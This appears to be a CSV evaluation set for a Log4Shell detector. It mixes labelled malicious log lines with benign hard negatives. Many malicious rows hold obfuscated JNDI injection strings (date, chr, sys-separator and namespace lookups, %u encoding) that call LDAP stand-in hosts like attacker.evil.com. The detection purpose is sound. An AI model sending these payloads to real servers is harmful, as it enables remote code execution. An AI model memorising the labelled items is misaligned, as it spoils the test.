id,timestamp,source,raw_log,normalized_log,label,attack_family,obfuscation_type,field,split,risk_level
OOD-900127,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.127 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.127 | x-api-version: ${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900085,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment}&request_id=ood-900085 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment}&request_id=ood-900085 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900073,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D&request_id=ood-900073 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d&request_id=ood-900073 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900274,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900274","info rendered json string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation trace_id=benign-ood-900274",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900261,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fprobe.example.net%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://probe.example.net/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900269,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900265,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flab-callback.example.org%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002flab-callback.example.org%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900020,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://evil.example/charcode}; sid=ood900020,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900053,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}&request_id=ood-900053 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://log4j-test.invalid/sys-separator}&request_id=ood-900053 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900251,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900251","info rendered json string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900251",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900245,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900210,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900210,warn unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900210,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900211,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900211,warn unit-test fixture expected='${jndi:ldap://log4j-test.invalid/fixture}' assertion=string_literal_only trace_id=benign-ood-900211,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900283,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900283,warn unit-test fixture expected='${jndi:ldap://lab-callback.example.org/fixture}' assertion=string_literal_only trace_id=benign-ood-900283,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900181,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup,info tutorial says type ${ then jndi then :ldap://attacker.evil.com separately; not a runtime lookup,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900240,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900240,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900240,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900076,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D; sid=ood900076,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d; sid=ood900076,1,log4shell,iis_percent_u_encoding,cookie,ood_stress_test,critical
OOD-900135,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.135 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.135 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900237,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900136,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://lab-callback.example.org/date-fragment}; sid=ood900136,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900005,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}&request_id=ood-900005 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://evil.example/sys-separator}&request_id=ood-900005 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900175,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900175,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900175,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900174,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900174,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900174,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900170,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fattacker.evil.com%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900170,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fattacker.evil.com%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900170,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900199,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900199,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900199,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900243,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900243,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900243,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900128,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://lab-callback.example.org/sys-separator}; sid=ood900128,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900218,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900218,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900218,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900077,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}&request_id=ood-900077 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}&request_id=ood-900077 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900074,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fcallback.local%u002Fpercent-u%u007D"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002fcallback.local%u002fpercent-u%u007d"",""host"":""callback.local""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900071,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.71 | X-Api-Version: ${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.71 | x-api-version: ${jndi:l${sys:user.name:-d}ap://log4j-test.invalid/protocol-sys},1,log4shell,protocol_fragment_sys_lookup,header,ood_stress_test,critical
OOD-900159,2026-05-17,ood_stress_hard_negative,INFO tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900159,info tutorial says type ${ then jndi then :ldap://evil.example separately; not a runtime lookup trace_id=benign-ood-900159,0,benign,benign_fragmented_tutorial_text,mixed,ood_stress_test,low
OOD-900042,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}"",""host"":""attacker.evil.com""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode}"",""host"":""attacker.evil.com""}",1,log4shell,charcode_lookup_reconstruction,json,ood_stress_test,critical
OOD-900035,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.35 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.35 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://attacker.evil.com/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900176,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900176,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900176,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900244,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900244,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900244,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900146,2026-05-17,ood_stress_hard_negative,GET /docs/log4shell?example=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fevil.example%u002Fdoc%u007D&mode=render-only HTTP/1.1 Host: kb.local trace_id=benign-ood-900146,get /docs/log4shell?example=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fevil.example%u002fdoc%u007d&mode=render-only http/1.1 host: kb.local trace_id=benign-ood-900146,0,benign,benign_percent_u_documentation,mixed,ood_stress_test,low
OOD-900037,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://attacker.evil.com/date-fragment}&request_id=ood-900037 HTTP/1.1 Host: victim.local,get /api/audit?trace=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://attacker.evil.com/date-fragment}&request_id=ood-900037 http/1.1 host: victim.local,1,log4shell,date_lookup_reconstruction,query,ood_stress_test,critical
OOD-900235,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900235,warn unit-test fixture expected='${jndi:ldap://callback.local/fixture}' assertion=string_literal_only trace_id=benign-ood-900235,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900165,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900252,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900252","info rendered json string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation trace_id=benign-ood-900252",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900097,2026-05-17,ood_stress_malicious,GET /api/audit?trace=%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Fprobe.example.net%u002Fpercent-u%u007D&request_id=ood-900097 HTTP/1.1 Host: victim.local,get /api/audit?trace=%u0024%u007bjndi%u003aldap%u003a%u002f%u002fprobe.example.net%u002fpercent-u%u007d&request_id=ood-900097 http/1.1 host: victim.local,1,log4shell,iis_percent_u_encoding,query,ood_stress_test,critical
OOD-900079,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.79 | X-Api-Version: ${j${sys:line.separator}ndi:ldap://callback.local/sys-separator},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.79 | x-api-version: ${j${sys:line.separator}ndi:ldap://callback.local/sys-separator},1,log4shell,sys_lookup_separator,header,ood_stress_test,critical
OOD-900087,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.87 | X-Api-Version: ${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://callback.local/date-fragment},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.87 | x-api-version: ${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://callback.local/date-fragment},1,log4shell,date_lookup_reconstruction,header,ood_stress_test,critical
OOD-900016,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}; sid=ood900016,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}; sid=ood900016,1,log4shell,date_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900246,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900246,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900246,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900185,2026-05-17,ood_stress_hard_negative,WARN unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only,warn unit-test fixture expected='${jndi:ldap://attacker.evil.com/fixture}' assertion=string_literal_only,0,benign,benign_unit_test_fixture,mixed,ood_stress_test,low
OOD-900238,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fcallback.local%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900238,get /search?q=${jndi:ldap://callback.local/research}&intent=research http/1.1 trace_id=benign-ood-900238,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900050,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""%u0024%u007Bjndi%u003Aldap%u003A%u002F%u002Flog4j-test.invalid%u002Fpercent-u%u007D"",""host"":""log4j-test.invalid""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""%u0024%u007bjndi%u003aldap%u003a%u002f%u002flog4j-test.invalid%u002fpercent-u%u007d"",""host"":""log4j-test.invalid""}",1,log4shell,iis_percent_u_encoding,json,ood_stress_test,critical
OOD-900105,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}&request_id=ood-900105 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://probe.example.net/unsupported-namespace}&request_id=ood-900105 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900179,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900179","info rendered json string value=""\\${jndi:ldap://attacker.evil.com/not-executed}"" source=documentation trace_id=benign-ood-900179",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900101,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}&request_id=ood-900101 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}&request_id=ood-900101 http/1.1 host: victim.local,1,log4shell,sys_lookup_separator,query,ood_stress_test,critical
OOD-900078,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}"",""host"":""callback.local""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${j${sys:line.separator}ndi:ldap://callback.local/sys-separator}"",""host"":""callback.local""}",1,log4shell,sys_lookup_separator,json,ood_stress_test,critical
OOD-900116,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://probe.example.net/charcode}; sid=ood900116,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
OOD-900083,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.83 | X-Api-Version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.83 | x-api-version: ${j${k8s:k5:-n}d${sd:k5:-i}:ldap://callback.local/unsupported-namespace},1,log4shell,unsupported_lookup_namespace,header,ood_stress_test,critical
OOD-900009,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}&request_id=ood-900009 HTTP/1.1 Host: victim.local,get /api/audit?trace=${j${k8s:k5:-n}d${sd:k5:-i}:ldap://evil.example/unsupported-namespace}&request_id=ood-900009 http/1.1 host: victim.local,1,log4shell,unsupported_lookup_namespace,query,ood_stress_test,critical
OOD-900014,2026-05-17,ood_stress_malicious,"POST /ingest HTTP/1.1 Host: victim.local Content-Type: application/json Body: {""ua"":""${${date:yyyy:-j}${date:MM:-n}${date:dd:-d}${date:HH:-i}:ldap://evil.example/date-fragment}"",""host"":""evil.example""}","post /ingest http/1.1 host: victim.local content-type: application/json body: {""ua"":""${${date:yyyy:-j}${date:mm:-n}${date:dd:-d}${date:hh:-i}:ldap://evil.example/date-fragment}"",""host"":""evil.example""}",1,log4shell,date_lookup_reconstruction,json,ood_stress_test,critical
OOD-900273,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://lab-callback.example.org/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900043,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.43 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.43 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://attacker.evil.com/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900093,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}&request_id=ood-900093 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://callback.local/protocol-sys}&request_id=ood-900093 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900117,2026-05-17,ood_stress_malicious,GET /api/audit?trace=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}&request_id=ood-900117 HTTP/1.1 Host: victim.local,get /api/audit?trace=${jndi:l${sys:user.name:-d}ap://probe.example.net/protocol-sys}&request_id=ood-900117 http/1.1 host: victim.local,1,log4shell,protocol_fragment_sys_lookup,query,ood_stress_test,critical
OOD-900168,2026-05-17,ood_stress_hard_negative,GET /search?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fresearch%7D&intent=research HTTP/1.1 trace_id=benign-ood-900168,get /search?q=${jndi:ldap://evil.example/research}&intent=research http/1.1 trace_id=benign-ood-900168,0,benign,benign_encoded_search_query,mixed,ood_stress_test,low
OOD-900139,2026-05-17,ood_stress_malicious,Request from User-Agent: Mozilla/5.0 | X-Forwarded-For: 10.0.0.139 | X-Api-Version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode},request from user-agent: mozilla/5.0 | x-forwarded-for: 10.0.0.139 | x-api-version: ${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://lab-callback.example.org/charcode},1,log4shell,charcode_lookup_reconstruction,header,ood_stress_test,critical
OOD-900104,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${j${sys:line.separator}ndi:ldap://probe.example.net/sys-separator}; sid=ood900104,1,log4shell,sys_lookup_separator,cookie,ood_stress_test,critical
OOD-900150,2026-05-17,ood_stress_hard_negative,DEBUG payload_sample=JHtqbmRpOmxkYXA6Ly9leGFtcGxlLmNvbS9hfQ== action=display_only decoded_by_ui=false trace_id=benign-ood-900150,debug payload_sample=jhtqbmrpomxkyxa6ly9legftcgxllmnvbs9hfq== action=display_only decoded_by_ui=false trace_id=benign-ood-900150,0,benign,benign_base64_artifact,mixed,ood_stress_test,low
OOD-900249,2026-05-17,ood_stress_hard_negative,"INFO rendered JSON string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation","info rendered json string value=""\\${jndi:ldap://probe.example.net/not-executed}"" source=documentation",0,benign,benign_json_escaped_payload,mixed,ood_stress_test,low
OOD-900092,2026-05-17,ood_stress_malicious,GET /profile HTTP/1.1 Host: victim.local Cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,get /profile http/1.1 host: victim.local cookie: prefs=light; tracking=${${chr:106}${chr:110}${chr:100}${chr:105}:ldap://callback.local/charcode}; sid=ood900092,1,log4shell,charcode_lookup_reconstruction,cookie,ood_stress_test,critical
